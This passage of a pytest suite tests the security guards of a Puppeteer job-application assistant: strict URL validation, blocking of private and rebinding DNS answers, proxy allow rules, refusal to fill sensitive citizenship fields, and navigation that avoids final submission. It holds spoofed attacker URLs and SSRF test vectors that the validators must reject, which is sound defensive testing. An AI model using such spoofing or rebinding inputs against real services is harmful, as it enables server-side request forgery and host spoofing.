    os.environ.get("RUN_PUPPETEER_INTEGRATION") != "1"
    and os.environ.get("RUN_PUPPETEER_HEADED_SMOKE") != "1",
    reason="set RUN_PUPPETEER_INTEGRATION=1 or RUN_PUPPETEER_HEADED_SMOKE=1",
)

def test_greenhouse_url_validation_accepts_only_structural_routes():
    assert validate_greenhouse_url("https://boards.greenhouse.io/acme/jobs/123").mode == "greenhouse_job"
    assert validate_greenhouse_url("https://job-boards.greenhouse.io/acme/jobs/123?gh_src=abc").mode == "greenhouse_job"
    assert validate_greenhouse_url("https://boards.greenhouse.io/embed/job_app?for=acme-team&token=123").mode == "greenhouse_embed"

    for url in [
        "http://boards.greenhouse.io/acme/jobs/123",
        "https://boards.greenhouse.io/acme/jobs/submit",
        "https://boards.greenhouse.io/acme/jobs/123?next=submit",
        "https://evil.example/acme/jobs/123",
        "https://boards.greenhouse.io/acme/jobs",
        "https://user:pass@boards.greenhouse.io/acme/jobs/123",
    ]:
        with pytest.raises(BrowserAdapterError):
            validate_greenhouse_url(url)


def test_lever_url_validation_is_exact_and_apply_scoped():
    uuid_url = "https://jobs.eu.lever.co/acme/123e4567-e89b-12d3-a456-426614174000"
    assert validate_ats_url(uuid_url, "lever").mode == "lever_job"
    assert validate_ats_url(uuid_url + "/apply", "lever").mode == "lever_apply"
    assert LEVER_FIXTURE.is_file()
    for url in [
        "http://jobs.eu.lever.co/acme/123e4567-e89b-12d3-a456-426614174000",
        uuid_url + "?next=confirm",
        "https://jobs.eu.lever.co/acme/job-123",
        "https://jobs.eu.lever.co/acme/123E4567-E89B-12D3-A456-426614174000",
        uuid_url + "/confirmation",
        "https://jobs.lever.co.evil.example/acme/123e4567-e89b-12d3-a456-426614174000",
        "https://user:pass@jobs.lever.co/acme/123e4567-e89b-12d3-a456-426614174000",
    ]:
        with pytest.raises(BrowserAdapterError):
            validate_ats_url(url, "lever")


def _resolver_frames(*, addresses: list[object]) -> dict:
    process = subprocess.Popen(
        ["node", "src/jobs_assistant/puppeteer_runner.js"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=str(Path.cwd()),
    )
    assert process.stdin is not None and process.stdout is not None
    hello_length = int(process.stdout.readline())
    process.stdout.read(hello_length)

    def send(payload: dict) -> dict:
        body = json.dumps(payload, separators=(",", ":")).encode()
        process.stdin.write(str(len(body)).encode() + b"\n" + body)
        process.stdin.flush()
        length = int(process.stdout.readline())
        return json.loads(process.stdout.read(length))

    response = send({"action": "classifyResolverResult", "addresses": addresses})
    send({"action": "close"})
    process.wait(timeout=5)
    return response
def test_global_unicast_resolver_classifier_rejects_special_and_accepts_safe() -> None:
    vectors = [
        ("127.0.0.1", 4, False),
        ("100.64.0.1", 4, False),
        ("0.1.2.3", 4, False),
        ("224.0.0.1", 4, False),
        ("192.0.2.1", 4, False),
        ("198.18.0.1", 4, False),
        ("203.0.113.1", 4, False),
        ("2001:db8::1", 6, False),
        ("::ffff:127.0.0.1", 6, False),
        ("fc00::1", 6, False),
        ("fe80::1", 6, False),
        ("ff02::1", 6, False),
        ("8.8.8.8", 4, True),
        ("2001:4860:4860::8888", 6, True),
    ]
    for address, family, accepted in vectors:
        response = _resolver_frames(addresses=[{"address": address, "family": family}])
        assert response["ok"] is accepted, (address, response)


def test_global_unicast_resolver_classifier_rejects_invalid_and_rebinding_second_answer() -> None:
    invalid = _resolver_frames(addresses=[{"address": "not-an-ip", "family": 4}])
    assert invalid == {"ok": False, "error": "resolver_address_rejected"}
    rebinding = _resolver_frames(
        addresses=[
            {"address": "8.8.8.8", "family": 4},
            {"address": "127.0.0.1", "family": 4},
        ]
    )
    assert rebinding == {"ok": False, "error": "resolver_address_rejected"}

def test_injected_resolver_is_called_once_and_pins_one_validated_result() -> None:
    env = os.environ.copy()
    env["JOBS_ASSISTANT_TEST_RESOLVER_JSON"] = json.dumps({
        "safe.example": [{"address": "8.8.8.8", "family": 4}],
        "rebind.example": [
            {"address": "8.8.8.8", "family": 4},
            {"address": "127.0.0.1", "family": 4},
        ],
    })
    process = subprocess.Popen(
        ["node", "src/jobs_assistant/puppeteer_runner.js"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=str(Path.cwd()),
        env=env,
    )
    assert process.stdin is not None and process.stdout is not None
    hello_length = int(process.stdout.readline())
    process.stdout.read(hello_length)

    def send(payload: dict) -> dict:
        body = json.dumps(payload, separators=(",", ":")).encode()
        process.stdin.write(str(len(body)).encode() + b"\n" + body)
        process.stdin.flush()
        length = int(process.stdout.readline())
        return json.loads(process.stdout.read(length))

    assert send({"action": "resolvePinnedAddress", "hostname": "safe.example"})["data"] == {"address": "8.8.8.8", "family": 4}
    assert send({"action": "networkCounters"})["data"]["dnsLookups"] == 1
    assert send({"action": "resolvePinnedAddress", "hostname": "rebind.example"})["ok"] is False
    assert send({"action": "networkCounters"})["data"]["dnsLookups"] == 2
    send({"action": "close"})
    process.wait(timeout=5)

def _start_test_proxy(
    *,
    logical_url: str,
    resolver: dict[str, list[dict[str, object]]],
    delay_ms: int = 0,
    upstream_port: int | None = None,
    upstream_host: str | None = None,
):
    env = os.environ.copy()
    env["JOBS_ASSISTANT_TEST_PROXY"] = "1"
    env["JOBS_ASSISTANT_TEST_RESOLVER_JSON"] = json.dumps(resolver)
    env["JOBS_ASSISTANT_TEST_RESOLVER_DELAY_MS"] = str(delay_ms)
    if upstream_port is not None:
        env["JOBS_ASSISTANT_TEST_PROXY_UPSTREAM_PORT"] = str(upstream_port)
    if upstream_host is not None:
        env["JOBS_ASSISTANT_TEST_PROXY_UPSTREAM_HOST"] = upstream_host
    process = subprocess.Popen(
        ["node", "src/jobs_assistant/puppeteer_runner.js"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=str(Path.cwd()),
        env=env,
    )
    assert process.stdin is not None and process.stdout is not None
    hello_length = int(process.stdout.readline())
    hello = json.loads(process.stdout.read(hello_length))
    assert hello["ok"] is True

    def send(payload: dict) -> dict:
        body = json.dumps(payload, separators=(",", ":")).encode()
        process.stdin.write(str(len(body)).encode() + b"\n" + body)
        process.stdin.flush()
        length = int(process.stdout.readline())
        return json.loads(process.stdout.read(length))

    setup = send({"action": "test_proxy_setup", "logical_url": logical_url})
    assert setup["ok"] is True, setup
    return process, send, int(setup["data"]["proxy_port"])


def _connect_proxy(port: int, authority: str) -> socket.socket:
    client = socket.create_connection(("127.0.0.1", port), timeout=2)
    client.sendall(
        f"CONNECT {authority} HTTP/1.1\r\nHost: {authority}\r\n"
        "Proxy-Connection: keep-alive\r\n\r\n".encode()
    )
    return client
def _assert_proxy_client_closed(client: socket.socket, timeout: float = 3.0) -> None:
    deadline = time.monotonic() + timeout
    client.settimeout(0.1)
    while time.monotonic() < deadline:
        try:
            if client.recv(4096) == b"":
                return
        except socket.timeout:
            continue
    raise AssertionError("proxy CONNECT client remained open")

def _close_test_proxy(process, send) -> None:
    try:
        response = send({"action": "close"})
        assert response["ok"] is True, response
    finally:
        process.wait(timeout=5)

def test_http_rechecks_state_after_delayed_dns_before_upstream_request():
    process, send, port = _start_test_proxy(
        logical_url="https://boards.greenhouse.io/acme/jobs/123",
        resolver={"boards.greenhouse.io": [{"address": "8.8.8.8", "family": 4}]},
        delay_ms=300,
    )
    client = socket.create_connection(("127.0.0.1", port), timeout=2)
    client.sendall(
        b"GET https://boards.greenhouse.io/acme/jobs/123 HTTP/1.1\r\n"
        b"Host: boards.greenhouse.io\r\nConnection: close\r\n\r\n"
    )
    try:
        time.sleep(0.05)
        frozen = send({"action": "test_proxy_freeze", "mutate": True})
        assert frozen["ok"] is True, frozen
        client.settimeout(3)
        response = client.recv(4096)
        assert response.startswith(b"HTTP/1.1 403"), response
        counters = send({"action": "networkCounters"})
        assert counters["ok"] is True, counters
        assert counters["data"]["dnsLookups"] == 1
        assert counters["data"]["upstreamHttpAttempts"] == 0
    finally:
        _close_test_proxy(process, send)
        client.close()
def test_connect_rechecks_state_after_delayed_dns_before_upstream_socket():
    resolver = {"boards.greenhouse.io": [{"address": "8.8.8.8", "family": 4}]}
    process, send, port = _start_test_proxy(
        logical_url="https://boards.greenhouse.io/acme/jobs/123",
        resolver=resolver,
        delay_ms=300,
    )
    client = _connect_proxy(port, "boards.greenhouse.io:443")
    try:
        time.sleep(0.05)
        frozen = send({"action": "test_proxy_freeze", "mutate": True})
        assert frozen["ok"] is True, frozen
        _assert_proxy_client_closed(client)
        counters = send({"action": "networkCounters"})
        assert counters["ok"] is True, counters
        assert counters["data"]["dnsLookups"] == 1
        assert counters["data"]["upstreamConnectAttempts"] == 0
    finally:
        _close_test_proxy(process, send)
        client.close()


def test_connect_disallows_different_greenhouse_authority_before_dns():
    process, send, port = _start_test_proxy(
        logical_url="https://boards.greenhouse.io/acme/jobs/123",
        resolver={"grnh.se": [{"address": "8.8.8.8", "family": 4}]},
        delay_ms=300,
    )
    client = _connect_proxy(port, "grnh.se:443")
    try:
        _assert_proxy_client_closed(client)
        counters = send({"action": "networkCounters"})
        assert counters["ok"] is True, counters
        assert counters["data"]["dnsLookups"] == 0
        assert counters["data"]["upstreamConnectAttempts"] == 0
    finally:
        _close_test_proxy(process, send)
        client.close()


def test_connect_allows_exact_logical_and_static_authorities_before_freeze():
    process, send, port = _start_test_proxy(
        logical_url="https://boards.greenhouse.io/acme/jobs/123",
        resolver={
            "boards.greenhouse.io": [{"address": "8.8.8.8", "family": 4}],
            "job-boards.cdn.greenhouse.io": [{"address": "8.8.8.8", "family": 4}],
        },
    )
    logical_client = _connect_proxy(port, "boards.greenhouse.io:443")
    static_client = _connect_proxy(port, "job-boards.cdn.greenhouse.io:443")
    try:
        deadline = time.monotonic() + 3
        counters = None
        while time.monotonic() < deadline:
            response = send({"action": "networkCounters"})
            assert response["ok"] is True, response
            counters = response["data"]
            if counters["upstreamConnectAttempts"] >= 2:
                break
            time.sleep(0.05)
        assert counters is not None
        assert counters["dnsLookups"] == 2
        assert counters["upstreamConnectAttempts"] == 2
    finally:
        _close_test_proxy(process, send)
        logical_client.close()
        static_client.close()

def test_connect_relay_peer_close_does_not_crash_protocol_owner():
    class HalfCloseHandler(socketserver.BaseRequestHandler):
        def handle(self):
            self.request.sendall(b"relay-first")
            time.sleep(0.25)
            try:
                self.request.sendall(b"relay-after-peer-close")
            except OSError:
                pass

    with socketserver.TCPServer(("127.0.0.1", 0), HalfCloseHandler) as upstream:
        upstream_thread = threading.Thread(target=upstream.serve_forever, daemon=True)
        upstream_thread.start()
        process, send, port = _start_test_proxy(
            logical_url="https://boards.greenhouse.io/acme/jobs/123",
            resolver={"boards.greenhouse.io": [{"address": "8.8.8.8", "family": 4}]},
            upstream_port=upstream.server_address[1],
            upstream_host="127.0.0.1",
        )
        client = _connect_proxy(port, "boards.greenhouse.io:443")
        try:
            client.settimeout(2)
            response = b""
            while b"\r\n\r\n" not in response or b"relay-first" not in response:
                response += client.recv(4096)
            client.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            client.close()
            client = None
            time.sleep(0.4)
            assert process.poll() is None
            counters = send({"action": "networkCounters"})
            assert counters["ok"] is True, counters
            assert counters["data"]["proxyTunnelsClosed"] >= 1
            assert counters["data"]["proxySocketErrors"] + counters["data"]["proxyWriteErrors"] >= 1
        finally:
            if client is not None:
                client.close()
            _close_test_proxy(process, send)
        upstream.shutdown()
        upstream_thread.join(timeout=5)

def test_preflight_does_not_launch_browser():
    data = PuppeteerSession.preflight()
    assert data["node"].startswith("v")
    assert data["puppeteer"] == "24.43.1"
    assert data["executablePathBasename"]


@BROWSER_INTEGRATION_SKIP
def test_observe_generation_final_marker_network_denial_and_cleanup(fixture_server):
    with PuppeteerSession.start(headless=True, session_id="session-test", run_id=1, job_id=123, internal_transport_url=fixture_server) as session:
        launch_pid = session.owner_pid
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        assert observation["observation_id"].startswith("obs-")
        assert observation["final_submit_target_ids"], observation
        first_shot = session.screenshot("initial")
        duplicate_shot = session.screenshot("blocker")
        assert first_shot["sha256"] == duplicate_shot["sha256"]
        assert first_shot["path"] == duplicate_shot["path"]
        assert duplicate_shot["deduplicated"] is True
        assert first_shot["reference"].startswith("screenshot:")
        first_name = field_by_name(observation, "first_name")
        resume = field_by_name(observation, "resume")
        assert first_name["field_key"]
        assert resume["kind"] == "file"
        assert "pdf" in ",".join(resume["accept"]).lower()

        session.fill(first_name["target_id"], "Ada")
        with pytest.raises(BrowserAdapterError, match="generation_already_consumed|stale_generation"):
            session.fill(first_name["target_id"], "Grace")

        counters = session.network_counters()
        assert counters["denied"] >= 1
        assert counters["attackerDnsLookups"] == 0
        assert counters["terminal_reason"] == "unsafe_network_attempt"
        assert FixtureHandler.final_like_requests == 0

    with pytest.raises(ProcessLookupError):
        os.kill(launch_pid, 0)
@BROWSER_INTEGRATION_SKIP
def test_citizenship_status_observation_is_sensitive_and_fill_denied(fixture_server):
    transport_url = fixture_server.replace("/clean", "/citizenship-status")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-citizenship-status",
        run_id=36,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        safe_field = field_by_name(observation, "first_name")
        citizenship = field_by_name(observation, "citizenshipStatus")
        assert "sensitive_field" not in safe_field["validity_flags"]
        assert citizenship["label"] == "Citizenship Status*"
        assert "Citizenship Status*" in citizenship["safety_descriptors"]
        assert "sensitive_field" in citizenship["validity_flags"]
        us_citizen = field_by_name(observation, "usCitizen")
        assert us_citizen["label"] == "Are you a U.S. citizen?"
        assert "sensitive_field" in us_citizen["validity_flags"]
        with pytest.raises(BrowserAdapterError, match="sensitive_field"):
            session.fill(citizenship["target_id"], "United States")

@BROWSER_INTEGRATION_SKIP
def test_observation_field_cap_accepts_global_boundary(fixture_server):
    transport_url = fixture_server.replace("/clean", "/field-cap-boundary")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-field-cap-boundary",
        run_id=30,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        assert len(observation["fields"]) == 1000
        assert not any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])


@BROWSER_INTEGRATION_SKIP
def test_observation_field_cap_overflow_fails_closed(fixture_server):
    transport_url = fixture_server.replace("/clean", "/field-cap-overflow")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-field-cap-overflow",
        run_id=31,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        assert len(observation["fields"]) == 1000
        assert any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])
        with pytest.raises(BrowserAdapterError, match="observation_too_large"):
            session.fill(observation["fields"][0]["target_id"], "blocked")


@BROWSER_INTEGRATION_SKIP
def test_observation_button_cap_accepts_per_frame_boundary(fixture_server):
    transport_url = fixture_server.replace("/clean", "/button-cap-boundary")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-button-cap-boundary",
        run_id=32,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        assert len(observation["buttons"]) == 400
        assert not any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])


@BROWSER_INTEGRATION_SKIP
def test_observation_button_cap_overflow_fails_closed(fixture_server):
    transport_url = fixture_server.replace("/clean", "/button-cap-overflow")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-button-cap-overflow",
        run_id=33,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        assert len(observation["buttons"]) == 400
        assert any(blocker["code"] == "observation_too_large" for blocker in observation["blockers"])
        assert observation["final_submit_target_ids"] == []


@BROWSER_INTEGRATION_SKIP
def test_aria_hidden_ancestor_controls_are_observed_but_not_actionable(fixture_server):
    transport_url = fixture_server.replace("/clean", "/aria-hidden")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-aria-hidden-field",
        run_id=34,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        hidden_field = field_by_name(observation, "hidden_field")
        hidden_button = next(button for button in observation["buttons"] if button["element_id"] == "hidden-button")
        assert hidden_field["visible"] is False
        assert hidden_button["visible"] is False
        assert field_by_name(observation, "visible_field")["visible"] is True
        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
            session.fill(hidden_field["target_id"], "blocked")


@BROWSER_INTEGRATION_SKIP
def test_aria_hidden_button_is_not_actionable(fixture_server):
    transport_url = fixture_server.replace("/clean", "/aria-hidden")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-aria-hidden-button",
        run_id=35,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        observation = session.observe()
        hidden_button = next(button for button in observation["buttons"] if button["element_id"] == "hidden-button")
        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
            session.click_offline(hidden_button["target_id"])




@BROWSER_INTEGRATION_SKIP
def test_submit_typed_nonfinal_continuation_click_uses_framed_offline_protocol(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-native")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-submit-continuation",
        run_id=2,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "submit"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        assert continuation["effective_action_url"] is None
        assert continuation["effective_method"] is None
        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
        next_observation = session.observe()
        assert next_observation["url"] == "https://boards.greenhouse.io/fixture/jobs/123?gh_src=step-2"

        counters = session.network_counters()
        assert counters["finalLikeDenied"] == 0
        assert counters["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0
        assert FixtureHandler.attacker_http_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_same_job_anchor_next_navigation_uses_guarded_continuation(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-continuation",
        run_id=3,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "anchor"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
        result = session.click_offline(continuation["target_id"], continuation=True)
        assert result["clicked"] is True
        next_observation = session.observe()
        assert next_observation["url"] == logical_url + "?gh_src=step-2"
        assert next_observation["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_semantic_drift_does_not_navigate(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-semantic-drift",
        run_id=53,
        job_id=123,
        internal_transport_url=transport_url,
        test_drift=True,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["element_id"] == "continue-anchor"
        )
        assert continuation["text"] == "Next"

        assert session._arm_button_semantic_drift_for_test()["armed"] is True
        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
            session.click_offline(continuation["target_id"], continuation=True)

        after = session.observe()
        drifted = next(
            button
            for button in after["buttons"]
            if button["element_id"] == "continue-anchor"
        )
        assert after["url"] == logical_url
        assert drifted["text"] == "Submit application"
        assert session.network_counters()["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_aria_disabled_drift_does_not_navigate(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-aria-disabled-drift",
        run_id=51,
        job_id=123,
        internal_transport_url=transport_url,
        test_drift=True,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["element_id"] == "continue-anchor"
        )
        assert continuation["enabled"] is True

        assert session._arm_button_aria_disabled_drift_for_test()["armed"] is True
        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
            session.click_offline(continuation["target_id"], continuation=True)

        after = session.observe()
        drifted = next(
            button
            for button in after["buttons"]
            if button["element_id"] == "continue-anchor"
        )
        assert after["url"] == logical_url
        assert drifted["enabled"] is False
        assert session.network_counters()["terminal_reason"] is None
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_allows_approved_static_after_destination_commit(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-static")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-static",
        run_id=37,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "anchor"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
        assert FixtureHandler.static_requests == 0
        before_static_requests = FixtureHandler.static_requests
        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
        next_observation = session.observe()
        assert next_observation["url"] == logical_url + "?gh_src=step-2"
        assert next_observation["terminal_reason"] is None
        assert FixtureHandler.static_requests > before_static_requests
        assert FixtureHandler.final_like_requests == 0
        assert session.network_counters()["terminal_reason"] is None


@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_static_cap_fails_closed(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-static-cap")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-static-cap",
        run_id=47,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["element_id"] == "continue-anchor"
        )

        with pytest.raises(BrowserAdapterError, match="observation_too_large"):
            session.click_offline(continuation["target_id"], continuation=True)

        assert session.network_counters()["terminal_reason"] == "observation_too_large"
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_rejects_old_page_pagehide_static_before_commit(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-pagehide-static")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-pagehide-static",
        run_id=45,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "anchor"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
        assert ANCHOR_PAGEHIDE_STATIC_URL in FixtureHandler.logical_urls
        before_static_requests = FixtureHandler.static_requests
        assert before_static_requests > 0
        before = session.network_counters()
        with pytest.raises(BrowserAdapterError, match="unsafe_(?:network_attempt|navigation_target)"):
            session.click_offline(continuation["target_id"], continuation=True)

        counters = session.network_counters()
        assert counters["terminal_reason"] == "unsafe_network_attempt"
        assert counters["upstreamConnectAttempts"] == before["upstreamConnectAttempts"] + 1
        assert counters["upstreamHttpAttempts"] == before["upstreamHttpAttempts"]
        assert counters["attackerDnsLookups"] == before["attackerDnsLookups"]
        assert FixtureHandler.static_requests == before_static_requests
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_bypasses_old_page_approved_static_listener(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-old-static")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-old-static",
        run_id=38,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "anchor"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
        assert FixtureHandler.static_requests == 0
        before_commit = session.network_counters()
        before_commit_static_requests = FixtureHandler.static_requests
        before_commit_attacker_requests = FixtureHandler.attacker_http_requests

        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
        destination = session.observe()
        assert destination["url"] == logical_url + "?gh_src=step-2"
        assert destination["terminal_reason"] is None
        assert not any(
            button["element_id"] == "old-page-listener-marker"
            for button in destination["buttons"]
        )

        counters = session.network_counters()
        assert counters["terminal_reason"] is None
        assert counters["attackerDnsLookups"] == before_commit["attackerDnsLookups"]
        assert counters["upstreamConnectAttempts"] == before_commit["upstreamConnectAttempts"] + 1
        assert counters["upstreamHttpAttempts"] == before_commit["upstreamHttpAttempts"]
        assert FixtureHandler.static_requests == before_commit_static_requests
        assert FixtureHandler.attacker_http_requests == before_commit_attacker_requests
        assert FixtureHandler.final_like_requests == 0


@BROWSER_INTEGRATION_SKIP
def test_anchor_continuation_bypasses_old_page_approved_static_websocket_listener(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-old-websocket")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-old-websocket",
        run_id=42,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        continuation = next(
            button
            for button in observation["buttons"]
            if button["button_type"] == "anchor"
            and button["target_id"] not in observation["final_submit_target_ids"]
        )
        assert continuation["href_url"] == logical_url + "?gh_src=step-2"
        assert FixtureHandler.static_requests == 0
        before_commit = session.network_counters()
        before_commit_static_requests = FixtureHandler.static_requests
        before_commit_attacker_requests = FixtureHandler.attacker_http_requests

        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True
        destination = session.observe()
        assert destination["url"] == logical_url + "?gh_src=step-2"
        assert destination["terminal_reason"] is None
        assert not any(
            button["element_id"] == "old-page-listener-marker"
            for button in destination["buttons"]
        )

        counters = session.network_counters()
        assert counters["terminal_reason"] is None
        assert counters["attackerDnsLookups"] == before_commit["attackerDnsLookups"]
        assert counters["upstreamConnectAttempts"] == before_commit["upstreamConnectAttempts"] + 1
        assert counters["upstreamHttpAttempts"] == before_commit["upstreamHttpAttempts"]
        assert FixtureHandler.static_requests == before_commit_static_requests
        assert FixtureHandler.attacker_http_requests == before_commit_attacker_requests
        assert FixtureHandler.final_like_requests == 0

@BROWSER_INTEGRATION_SKIP
def test_anchor_empty_target_matches_no_target_and_continues(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-empty")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-empty-target",
        run_id=39,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        continuation = next(button for button in session.observe()["buttons"] if button["button_type"] == "anchor")
        assert continuation["target"] == ""
        assert session.click_offline(continuation["target_id"], continuation=True)["clicked"] is True


@BROWSER_INTEGRATION_SKIP
def test_bare_anchor_download_is_observed_and_denied(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-download")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-download",
        run_id=40,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        continuation = next(button for button in session.observe()["buttons"] if button["button_type"] == "anchor")
        assert continuation["download"] is True
        with pytest.raises(BrowserAdapterError, match="final_or_anchor_not_automated"):
            session.click_offline(continuation["target_id"], continuation=True)


@BROWSER_INTEGRATION_SKIP
def test_anchor_href_snapshot_drift_fails_closed(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-anchor-drift")
    with PuppeteerSession.start(
        headless=True,
        session_id="session-anchor-drift",
        run_id=41,
        job_id=123,
        internal_transport_url=transport_url,
    ) as session:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        continuation = next(button for button in session.observe()["buttons"] if button["button_type"] == "anchor")
        time.sleep(3.2)
        with pytest.raises(BrowserAdapterError, match="stale_generation"):
            session.click_offline(continuation["target_id"], continuation=True)

@BROWSER_INTEGRATION_SKIP
def test_native_progress_button_drift_rejects_without_side_effects(fixture_server):
    transport_url = fixture_server.replace("/clean", "/continue-native-progress-drift")
    logical_url = "https://boards.greenhouse.io/fixture/jobs/123"
    with PuppeteerSession.start(
        headless=True,
        session_id="session-native-progress-drift",
        run_id=43,
        job_id=123,
        internal_transport_url=transport_url,
        test_drift=True,
    ) as session:
        session.goto(logical_url)
        observation = session.observe()
        drift = next(button for button in observation["buttons"] if button["element_id"] == "drift-button")
        assert drift["button_type"] == "button"
        before = session.network_counters()
        before_static_requests = FixtureHandler.static_requests
        before_attacker_requests = FixtureHandler.attacker_http_requests

        assert session._arm_button_semantic_drift_for_test()["armed"] is True
